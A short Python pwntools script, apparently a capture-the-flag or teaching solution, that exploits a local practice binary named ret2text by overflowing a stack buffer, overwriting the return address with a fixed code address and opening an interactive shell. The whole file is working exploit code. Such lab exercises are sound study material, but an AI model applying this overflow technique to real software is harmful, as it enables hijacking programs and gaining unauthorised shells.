from pwn import *

target = 0x0804863A
sh = process("./bin/ret2text")
sh.sendline(b"a" * (0x6C + 4) + p32(target))
sh.interactive()
